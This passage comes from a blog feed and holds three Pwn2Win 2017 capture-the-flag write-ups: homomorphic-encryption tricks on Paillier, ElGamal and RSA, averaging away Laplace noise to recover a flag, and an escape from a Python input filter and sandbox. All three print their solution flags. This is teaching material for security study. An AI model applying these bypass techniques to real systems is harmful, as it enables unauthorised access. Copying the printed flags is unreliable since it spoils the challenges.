<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">&gt;&gt;&gt; p = 952658582963</div><div class="line">&gt;&gt;&gt; q = 815338256053</div><div class="line">&gt;&gt;&gt; n = p * q</div><div class="line">&gt;&gt;&gt; g = 776738987646974637425040</div><div class="line">&gt;&gt;&gt; enc = 104466234975614190334351556746005105225005455760</div><div class="line">&gt;&gt;&gt; phi = (p-1)*(q-1)</div><div class="line">&gt;&gt;&gt; miu = modinv((pow(g, phi, n**2)-1)/n, n)</div><div class="line"># decrypt and find a</div><div class="line">&gt;&gt;&gt; z = pow(enc, phi, n**2)</div><div class="line">&gt;&gt;&gt; z = (z - 1)/n</div><div class="line">&gt;&gt;&gt; a = z*miu % n</div><div class="line">&gt;&gt;&gt; a</div><div class="line">593865001407021231568482L</div><div class="line"># encrypt a^5</div><div class="line">&gt;&gt;&gt; r = 5  #whatever number</div><div class="line">&gt;&gt;&gt; (pow(g, a**5, n**2) * pow(r, n, n**2)) % (n**2)</div><div class="line">551344609697032782258820295222867131320370770770L</div></pre></td></tr></table></figure>
<p>Correct. Next we find again ElGamal.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">n = 776738987646974637425039</div><div class="line">g = 776738987646974637425040</div><div class="line">enc(a) = 104466234975614190334351556746005105225005455760</div><div class="line">enc(a^5)?</div><div class="line">551344609697032782258820295222867131320370770770</div><div class="line">Correct! Next...</div><div class="line">q = 162468360679141142763506469479039044723348598131343445023537528281758038856725899813448600764965664562827243890486154155054547681581530078506256454819062823302171522262160978639320056038295558351438333626355253455829930861656788077110705347484186791527605530619097928023950578487542852122604132414043739150119</div><div class="line">g = 71617122044994067303905663362038925673552248437100144808168324877801061768171815833721974961532703253044394601768959631644002378569370957141698573753120813269172546820898334296643254497348710964283337196775523365259211998702039022625622498418357561295233596431521761773785941196196533383471457791068304542860</div><div class="line">h = 111066648693171887028924716387930536202901514118903026147266454463707523131763918297711469710662207420385870870164685517351171893585068487655691524361140991885848958718360460992751593253073812391597394918180851967495018510187596343611325247877606623904208279091478507563768905318293335621925954116646006910388</div><div class="line">enc(a) = (21624535586567506603984186779885207318602579759808112698630259017417529498649485922951645341096345328763025063786609897082667076531258136422106222993285575007280223388512289362685146566945916187517382905780252904425034481330835615708515857702294263742141184959896884068790745261235435155068299465225574582560, 38537941029975848030592009789690349376115082020053275876066791343139798710924237464927608815778845257515757255006036413842443376625286738601962899180988337782103893434680014360059921519888813156293982852260141731565853893416439570684816679875490888188370627554793241614773190030997959436875113067106880655048)</div><div class="line">enc(a^7)?</div></pre></td></tr></table></figure>
<p>This one is easy. The ElGamal encryption of a is the following.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">E(a) = (g^r mod q, a * h^r mod q)</div></pre></td></tr></table></figure>
<p>To obtain the encryption of a^7, we elevate E(a) to the power of 7.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">E(a)^7 = ((g^r mod q)^7, (a * h^r mod q)^7) = (g^(7r) mod q, a^7 * h^(7r) mod q) = E(a^7)</div></pre></td></tr></table></figure>
<p>Therefore:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">...</div><div class="line">define q, h, g</div><div class="line">...</div><div class="line">&gt;&gt;&gt; enc = (21624535586567506603984186779885207318602579759808112698630259017417529498649485922951645341096345328763025063786609897082667076531258136422106222993285575007280223388512289362685146566945916187517382905780252904425034481330835615708515857702294263742141184959896884068790745261235435155068299465225574582560, 38537941029975848030592009789690349376115082020053275876066791343139798710924237464927608815778845257515757255006036413842443376625286738601962899180988337782103893434680014360059921519888813156293982852260141731565853893416439570684816679875490888188370627554793241614773190030997959436875113067106880655048)</div><div class="line">&gt;&gt;&gt; (pow(enc[0], 7, q), pow(enc[1], 7, q))</div><div class="line">(111943704492198613677284064414263835827314903408795497288196730523366749172531261312939368180540744924661825776170153157857298436145855968660805139686412343878802804331392369688765040244903208295888020856843171734022924414044150587927040617364297225555547079482268117880403242431146502775006475807941590243957, 146944962972196061304452302982428886923580067615704091332968984386866821167820106942309825648793805501664148988040753726356825992452196561280275962919553230491290426455421904803150216668843887712124953140424115672066452860798980586595286092420270643236030879120858647424877506090672990669173730588282484181475)</div></pre></td></tr></table></figure>
<p>Correct. The next one is another RSA with the following parameters.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">n = 116129573369269565162236051660667188158855673329540427297390499575862981989835841843866583577063083766954029063144621040623764875768299287457499920694511048949688694670794953791035923764107936680805021705444041635396218234076099965276137996734996446529395542124683260815237555361324912425749295153953132095761</div><div class="line">e = 65537</div><div class="line">enc(a) = 113404819639317667150945206046179254025822100958261129257002960505190359188994098567188808686386964857225447271200495440587539103432162087685650112552863460383570740714408941280241382042752738643406032354358166194009200674868816147437559543328518217678994594982357470461665835857915008170677398859755267093420</div><div class="line">enc((31*a)^7)?</div></pre></td></tr></table></figure>
<p>RSA is homomorphic to the multiplication and powers. Just do the following.</p>
<ol>
<li>Encrypt 31.</li>
<li>Multiply the encryption of 31 to the encryption of a. (z = E(31) * E(a) % n)</li>
<li>Power it. (result = pow(z, 7, n))</li>
<li>Done. result is 79422070142774248998696748364536969928051026241019028333521995212847190464228596819898318295431833653185507986566295081274239311469462993984644730127173443271940560058698451295020485382667406426759092058704807263661852917928725084340240033097368645878075171977767675641790645116925564507723204703462264972052</li>
</ol>
<p>Next. Another Paillier.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">n = 8621606345813741778522514266054273377220780538934639795782688699674225088206322295464704691574306739432963387326203941438845912627154353843605597106654023</div><div class="line">g = 8621606345813741778522514266054273377220780538934639795782688699674225088206322295464704691574306739432963387326203941438845912627154353843605597106654024</div><div class="line">enc(a) = 7937660128690175325568344972823559278861468103813145508603245376730524355646304917359508580566100608589042820651231838238609822717639617861887063282742304194177278580800908754694218555803321746479637321316698926171902620676195782762387943008573984077258721183694556844093549693467565523559928218327284235089</div><div class="line">enc(b) = 33387753148071257428905539518160221978694704069687353836469091655010096223312256529016397591008817430414577588510555623557614906758093969392417915817764626568693773437705685363505728318306424617495507184665856273528630405473435911817059436953757079883134497707484413544554359132244534862297762773379557525426</div><div class="line">enc(31*a + 12*b + 56)?</div></pre></td></tr></table></figure>
<p>Pallier is homomorphic to the addition and the multiplication, in the following way:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">E(m1)^k = E(k*m1)</div><div class="line">E(m1)E(m2) = E(m1 + m2)</div></pre></td></tr></table></figure>
<p>The result is:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">(pow(E(a),31,n**2) * pow(E(b), 12, n**2)) * E(56) % n**2 = 4970421455367244845374713137266537502697958490590659650451726192347671487410827360664416249739491204023927184480151500339026488270807023596092868579949981952165240250817692006905532570205653975588657894036033054920661457321178863796257037956921744588997061459597410104137746663293674207917309975395301044061</div></pre></td></tr></table></figure></p>
<p>Finally, the flag is given to us:<br>CTF-BR{ASym3tric_partially_Homomorphic_3ncryPt1on}</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Asymmetric Encryption&lt;br&gt;Bloodsuckers use different asymmetric encryption algorithms to send messages to their partners. You
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="rsa" scheme="https://teamrocketist.github.io/tags/rsa/"/>
    
      <category term="elgamal" scheme="https://teamrocketist.github.io/tags/elgamal/"/>
    
      <category term="pallier" scheme="https://teamrocketist.github.io/tags/pallier/"/>
    
      <category term="discrete log" scheme="https://teamrocketist.github.io/tags/discrete-log/"/>
    
  </entry>
  
  <entry>
    <title>Crypto-Pwn2Win-2017-Differential-Privacy</title>
    <link href="https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/"/>
    <id>https://teamrocketist.github.io/2017/10/22/Crypto-Pwn2Win-2017-Differential-Privacy/</id>
    <published>2017-10-22T18:59:47.000Z</published>
    <updated>2017-10-24T08:02:37.848Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Differential Privacy<br><br>Is it possible to have privacy on these days? The Rebelious Fingers do not think so. Get the flag.<br><br>Server: nc 200.136.213.143 9999<br><br></blockquote>

<p>We accessed the service and we try to get the info.</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Hello, chose an option:</div><div class="line">[1] Info</div><div class="line">[2] Query the flag (<span class="keyword">in</span> ASCII)</div><div class="line">[3] Quit</div><div class="line">1</div><div class="line">You can query the flag, but the characters are private (indistinguishable).</div><div class="line">Differential privacy mechanism: Laplace</div><div class="line">Sensitivity: ||125 - 45|| = 80</div><div class="line">Epsilon: 6.5</div></pre></td></tr></table></figure>
<p>From this information we know that maybe the service is using a differential privacy mechanism to hide the flag. We also know that the mechanism is “Laplace”.<br>After a little research, we found the explanation of the differential privacy mechanism using the Laplace distribution. In this mechanism, the original value is added to a random value that obeys the Laplace distribution. This random value from the Laplace distribution is called laplace noise.<br>The specific laplace distribution used in differential privacy is Laplace(0, sensitivity/epsilon). For more information on the Laplace distribution follow <a href="https://en.wikipedia.org/wiki/Laplace_distribution" target="_blank" rel="external">https://en.wikipedia.org/wiki/Laplace_distribution</a>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">anonymized = original + random_from_laplace</div></pre></td></tr></table></figure>
<p>We query the flag and obtain:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Hello, chose an option:</div><div class="line">[1] Info</div><div class="line">[2] Query the flag (in ASCII)</div><div class="line">[3] Quit</div><div class="line">2</div><div class="line">[75, 86, 83, 36, 56, 87, 146, 54, 97, 118, 110, 132, 101, 118, 120, 118, 112, 91, 103, 88, 140, 112, 110, 112, 120, 64, 95, 73, 97, 96, 114, 98, 113, 112, 113, 110, 118]</div></pre></td></tr></table></figure>
<p>So, maybe, the service is adding laplace noise to the ASCII values (integer) of the flag.</p>
<p>If we query again, the values are different:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">Hello, chose an option:</div><div class="line">[1] Info</div><div class="line">[2] Query the flag (in ASCII)</div><div class="line">[3] Quit</div><div class="line">2</div><div class="line">[64, 82, 67, 35, 71, 82, 118, 74, 95, 128, 98, 92, 108, 102, 123, 107, 94, 99, 103, 78, 102, 98, 111, 101, 114, 113, 111, 135, 97, 74, 92, 107, 93, 114, 111, 90, 128]</div></pre></td></tr></table></figure>
<p>We know that Laplace(0, sensitivity/epsilon) has average 0. So, if we average sufficient anonymized records of the flag, the random noise added will be canceled (because the average of the Laplace is 0), and the original value of the flag is obtained.</p>
<p>So, the trick here is to query the flag plenty of times (we queried 10000 times) and average each entry.</p>
<p>Here is sample code:</p>
<pre><code class="python"><span class="keyword">from</span> pwn <span class="keyword">import</span> *

<span class="function"><span class="keyword">def</span> <span class="title">get_list</span><span class="params">()</span>:</span>
    r = remote(<span class="string">'200.136.213.143'</span>, <span class="number">9999</span>)
    r.recvline()
    r.recvline()
    r.recvline()
    r.recvline()
    r.send(<span class="string">"2\n"</span>)
    <span class="keyword">return</span> eval(r.recvline())

d = []

<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">37</span>):
    d.append(list())

<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">10000</span>):
    <span class="keyword">if</span> i % <span class="number">10</span> == <span class="number">0</span>:
        <span class="keyword">print</span> i

    l = get_list()
    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(l)):
        d[j].append(l[j])

<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">37</span>):
    av = sum(d[i]) / len(d[i])
    result.append(int(round(av)))

<span class="keyword">print</span> result

<span class="keyword">print</span> <span class="string">""</span>.join([chr(c) <span class="keyword">for</span> c <span class="keyword">in</span> result])
</code></pre>
<p>At the end, we obtain the flag:</p>
<p>CTF-BR{I_am_just_filtering_the_noise}</p>
<p>EDIT: bug in the source code. Thank you LFChang.</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Differential Privacy&lt;br&gt;&lt;br&gt;Is it possible to have privacy on these days? The Rebelious Fingers do not think so. Get the fla
    
    </summary>
    
      <category term="Crypto" scheme="https://teamrocketist.github.io/categories/Crypto/"/>
    
    
      <category term="crypto" scheme="https://teamrocketist.github.io/tags/crypto/"/>
    
      <category term="laplace" scheme="https://teamrocketist.github.io/tags/laplace/"/>
    
      <category term="differential" scheme="https://teamrocketist.github.io/tags/differential/"/>
    
  </entry>
  
  <entry>
    <title>[Pwn] Pwn2Win - Tokens v2.0</title>
    <link href="https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Tokens-v2-0/"/>
    <id>https://teamrocketist.github.io/2017/10/22/Pwn-Pwn2Win-Tokens-v2-0/</id>
    <published>2017-10-22T17:47:30.000Z</published>
    <updated>2017-10-22T18:17:31.914Z</updated>
    
    <content type="html"><![CDATA[<blockquote><br>Tokens v2.0<br><br>We have discovered that the upper echelon of Butcher Corp. uses a temporary token generator along with their brain chips as a form of 2FA(Two-Factor Authentication) for their most restricted systems. Our intel team got their source code, but we still haven’t got the seed right. We need you to get it for us, as we’re sure it will be useful for other systems! The name of one of this system’s users is “Dúfa van Tryggvadóttir”, vice president of the company.<br><br>Source Code:<br><br>Link<br><br>Mirror<br><br>Server: nc 200.136.213.114 4000<br><br>Id: tokens_v20<br><br>Total solves: 22<br><br>Score: 283<br><br>Categories: Exploitation<br></blockquote>

<p>This exploitation challenge is about this python script:<br><a href="https://pastebin.com/144yVeZF" target="_blank" rel="external">https://pastebin.com/144yVeZF</a></p>
<p>This challenge has 3 steps to be solved:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">1 - Find a regex that matches &quot;Dúfa van Tryggvadóttir&quot; with some restrictions.</div><div class="line">2 - Bypass de options checks and run gen function.</div><div class="line">3 - Bypass the Sand box and print the seed (Which was the flag).</div></pre></td></tr></table></figure>
<h3 id="Find-a-regex-that-matches-“Dufa-van-Tryggvadottir”-with-some-restrictions"><a href="#Find-a-regex-that-matches-“Dufa-van-Tryggvadottir”-with-some-restrictions" class="headerlink" title="Find a regex that matches “Dúfa van Tryggvadóttir” with some restrictions."></a>Find a regex that matches “Dúfa van Tryggvadóttir” with some restrictions.</h3><p>This is easy even with these restrictions:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">limit = <span class="number">22</span></div><div class="line"><span class="keyword">if</span> len(regex) &gt; limit:</div><div class="line">	<span class="keyword">print</span> <span class="string">"What kind of name is yours?"</span></div><div class="line">	exit()</div><div class="line">	</div><div class="line">tmp = re.findall(<span class="string">"[^A-z+]"</span>, regex)</div><div class="line">tmp1 = re.findall(<span class="string">"[\[\]]"</span>, regex)</div></pre></td></tr></table></figure>
<p>The first regex matches every single character not present in the list below <strong>[^A-z+]</strong>:  </p>
<ul>
<li><strong>A-z</strong> a single character in the range between <strong>A</strong> (index <em>65</em>) and <strong>z</strong> (index <em>122</em>) (case sensitive)  </li>
<li><strong>+</strong> matches the character <strong>+</strong> literally (case sensitive)  </li>
</ul>
<p>The second regex matches every single character present in the list below <strong>[\[\]]</strong>:  </p>
<ul>
<li><strong>[</strong> matches the character <strong>[</strong> literally (case sensitive)  </li>
<li><strong>]</strong> matches the character <strong>]</strong> literally (case sensitive)  </li>
</ul>
<p>So we can use characters from index <em>65</em> to index <em>122</em> any others outside this range is forbidden(consult <a href="ASCII TABLE">http://www.asciitable.com/index/asciifull.gif</a>) and we can’t user <strong>[</strong> or <strong>]</strong> and a limit of 22 characters.</p>
<p>Our aproach to this step was easy to find something that was equivalent to the <strong>.</strong> character, which in regex means matching any character except for new line, we have the <strong>+</strong> character. We used the following regex:<br><a data-fancybox="gallery" href="https://i.imgur.com/aJQxZ8T.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/aJQxZ8T.png" alt=""><br></a><br>If we test this in the binary we can see it worked!:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">$ nc 200.136.213.114 4000</div><div class="line">Hello! Log on to the Token Generation System</div><div class="line">If your name is not on the authorized list, a notification will be generated!</div><div class="line">For security reasons, NEVER <span class="built_in">type</span> your literal name.</div><div class="line">Type your regex-name to identify ([^\[\]][A-z+]): D\D+r</div><div class="line"></div><div class="line">Hello, Vice-President!</div><div class="line"></div><div class="line">[Open] - To create a new token</div><div class="line">[Revoke] - To Revoke a token</div><div class="line">Type the option:</div></pre></td></tr></table></figure>
<h3 id="Bypass-de-options-checks-and-run-gen-function"><a href="#Bypass-de-options-checks-and-run-gen-function" class="headerlink" title="Bypass de options checks and run gen function"></a>Bypass de options checks and run gen function</h3><p>This is the part of the code we need to analyse:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> role == <span class="string">"President"</span> <span class="keyword">and</span> <span class="string">"Open"</span> <span class="keyword">in</span> option <span class="keyword">or</span> <span class="string">"Revoke"</span> <span class="keyword">in</span> option:</div><div class="line">	authorized = <span class="number">1</span></div><div class="line"><span class="keyword">else</span>:</div><div class="line">	<span class="keyword">print</span> <span class="string">"For now, only the president is allowed to generate tokens."</span></div><div class="line">	exit()</div></pre></td></tr></table></figure>
<p>The first thing we have to do here is to choose Revoke, we don’t have the Presidents name so if we don’t want to exit the program, there will be a second check:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">if</span> authorized:</div><div class="line">	<span class="keyword">print</span> <span class="string">"\nFor security reasons, confirme your option!"</span></div><div class="line">	option = Option()</div><div class="line">	option_test = re.findall(<span class="string">'[\w]+'</span>, option)</div><div class="line">	<span class="keyword">for</span> s <span class="keyword">in</span> option_test:</div><div class="line">		<span class="keyword">if</span> s == <span class="string">"Open"</span>:</div><div class="line">			<span class="keyword">print</span> <span class="string">"Mr. President, enable the option to generate tokens on the server."</span></div><div class="line">			exit()</div><div class="line">		<span class="keyword">elif</span> s == <span class="string">"Revoke"</span>:</div><div class="line">			token = raw_input(<span class="string">"Type your token serial: "</span>).strip()</div><div class="line">			<span class="keyword">if</span> len(token) &gt; <span class="number">4</span> <span class="keyword">or</span> token.isdigit() != <span class="keyword">True</span>:</div><div class="line">				<span class="keyword">print</span> <span class="string">"Revise your token!"</span></div><div class="line">				exit()</div><div class="line">			<span class="keyword">else</span>:</div><div class="line">				open = file(<span class="string">"canceled-tokens.txt"</span>, <span class="string">"a"</span>)</div><div class="line">				time = datetime.now()</div><div class="line">				open.writelines(<span class="string">"\nToken canceled at: %02d/%02d/%02d %02d:%02d:%02d:\n"</span> % (time.month, time.day, time.year, time.hour, time.minute, time.second))</div><div class="line">				open.writelines(token)</div><div class="line">				open.close()</div><div class="line">				<span class="keyword">print</span> <span class="string">"This will go through by a manual inspection, thank you Mr. "</span> + role + <span class="string">"!"</span></div><div class="line">				exit()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			<span class="keyword">print</span> <span class="string">"Incorrect option, please, try again!"</span>	</div><div class="line">		</div><div class="line">	option = string(option)</div></pre></td></tr></table></figure>
<p>As we can see above doesn’t matter what we choose we will always exit the program so what we do here? we need to find a trick, to bypass this and still have the option “Open” as we can see in the end they are removing all <strong>\</strong> of the string in the final of the loop:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">string</span><span class="params">(object)</span>:</span></div><div class="line"></div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, string)</span>:</span></div><div class="line">		self.string = string</div><div class="line">		</div><div class="line">	<span class="function"><span class="keyword">def</span> <span class="title">strip</span><span class="params">(self)</span>:</span></div><div class="line">		test = re.findall(<span class="string">r"[\\\n\t\r]"</span>, self.string)</div><div class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> test:</div><div class="line">			self.string = self.string.replace(i, <span class="string">""</span>)</div><div class="line">		</div><div class="line">		<span class="keyword">return</span> self.string</div></pre></td></tr></table></figure>
<p>And the calls:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">        <span class="string">"Truncated code of the loop"</span></div><div class="line">        option = string(option)</div><div class="line"><span class="keyword">if</span> option.strip() == <span class="string">"Open"</span>:</div><div class="line">        gen()</div></pre></td></tr></table></figure></p>
<p>This very useful! this removes newlines or \ characters! The regex expression that splits the string does this:<br><a data-fancybox="gallery" href="https://i.imgur.com/cjgXXF9.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/cjgXXF9.png" alt=""><br></a></p>
<p>If we inject <strong>O\pen</strong> it will match the words <strong>O</strong> and <strong>pen</strong> and when we enter in the loop we won’t choose any of the options not exiting the program, after this the <strong>string class</strong> will help us getting the <strong>Open</strong> string!<br>If we do this we will run the <strong>gen</strong> function:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div></pre></td><td class="code"><pre><div class="line">$ nc 200.136.213.114 4000</div><div class="line">Hello! Log on to the Token Generation System</div><div class="line">If your name is not on the authorized list, a notification will be generated!</div><div class="line">For security reasons, NEVER <span class="built_in">type</span> your literal name.</div><div class="line">Type your regex-name to identify ([^\[\]][A-z+]): D\D+r</div><div class="line"></div><div class="line">Hello, Vice-President!</div><div class="line"></div><div class="line">[Open] - To create a new token</div><div class="line">[Revoke] - To Revoke a token</div><div class="line">Type the option: Revoke</div><div class="line"></div><div class="line">For security reasons, confirme your option!</div><div class="line">[Open] - To create a new token</div><div class="line">[Revoke] - To Revoke a token</div><div class="line">Type the option: O\pen</div><div class="line">Incorrect option, please, try again!</div><div class="line">Incorrect option, please, try again!</div><div class="line"></div><div class="line">Usage:</div><div class="line">gen <span class="string">'token serial number'</span></div><div class="line"></div><div class="line">E.g.:</div><div class="line">gen 2017</div><div class="line"></div><div class="line">&gt;&gt;&gt;</div></pre></td></tr></table></figure>
<h3 id="Bypass-the-Sand-box-and-print-the-seed-Which-was-the-flag"><a href="#Bypass-the-Sand-box-and-print-the-seed-Which-was-the-flag" class="headerlink" title="Bypass the Sand box and print the seed (Which was the flag)"></a>Bypass the Sand box and print the seed (Which was the flag)</h3><p>First we have some characters we can’t use:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">validation</span><span class="params">(input)</span>:</span></div><div class="line">	err = int()</div><div class="line">	input = str(input)</div><div class="line">	nochrs = <span class="string">'[&amp;*+-/34689?\&lt;_&gt;!@#`|$%;&#123;&#125;]'</span></div><div class="line">	<span class="keyword">if</span> re.findall(nochrs, input): err = <span class="number">1</span></div><div class="line">	<span class="keyword">else</span>: err = <span class="number">0</span></div><div class="line">		</div><div class="line">	<span class="keyword">if</span> <span class="keyword">not</span> err: <span class="keyword">return</span> <span class="number">1</span></div><div class="line">	<span class="keyword">else</span>: <span class="keyword">return</span> <span class="number">0</span></div></pre></td></tr></table></figure>
<p>Analysing the regular expression we have:<br><a data-fancybox="gallery" href="https://i.imgur.com/1aVNBTa.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/1aVNBTa.png" alt=""><br></a></p>
<p>The characters between the range <em>43</em> and <em>47</em> are:<br><a data-fancybox="gallery" href="https://i.imgur.com/X3vFwws.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/X3vFwws.png" alt=""><br></a></p>
<p>We can’t use any of the characters above and there is more, we can’t use most of the built_in functions because they are being removed here:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">safe</span><span class="params">()</span>:</span></div><div class="line">    <span class="keyword">from</span> sys <span class="keyword">import</span> modules</div><div class="line">    modules.clear()</div><div class="line">    <span class="keyword">del</span> modules</div><div class="line">    <span class="keyword">global</span> input, compile, execfile, globals, vars, open, file, reload, __import__, locals, dir</div><div class="line">    input, compile, execfile, globals, vars, locals, open, file, reload, __import__, dir = <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span>, <span class="keyword">None</span></div><div class="line">    __builtins__.dir = <span class="keyword">None</span></div></pre></td></tr></table></figure>
<p>We tried hard to bypass and we couldn’t do it, we knew that we needed to run <strong>raw_input(seed)</strong> this function would print the seed for us unfortunately the <strong>_</strong> character was filtered too, so we found this function within the code:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">Option</span><span class="params">()</span>:</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"[Open] - To create a new token"</span></div><div class="line">	<span class="keyword">print</span> <span class="string">"[Revoke] - To Revoke a token"</span></div><div class="line">	opt = raw_input(<span class="string">"Type the option: "</span>)</div><div class="line">	<span class="keyword">return</span> opt</div></pre></td></tr></table></figure>
<p>This is perfect if we run <strong>gen Options()</strong> it will run another <strong>raw_input</strong> without any filters and then we can inject any character we want! Here is the example how to do it:<br><a data-fancybox="gallery" href="https://i.imgur.com/R3FxQXf.png" target="_blank" rel="external"><br><img src="https://i.imgur.com/R3FxQXf.png" alt=""><br></a><br>The flag was <strong>CTF-BR{fiev4zi3Nais7ue7aiSh}</strong></p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;&lt;br&gt;Tokens v2.0&lt;br&gt;&lt;br&gt;We have discovered that the upper echelon of Butcher Corp. uses a temporary token generator along with th
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
    
      <category term="python" scheme="https://teamrocketist.github.io/tags/python/"/>
    
      <category term="pwn" scheme="https://teamrocketist.github.io/tags/pwn/"/>
    
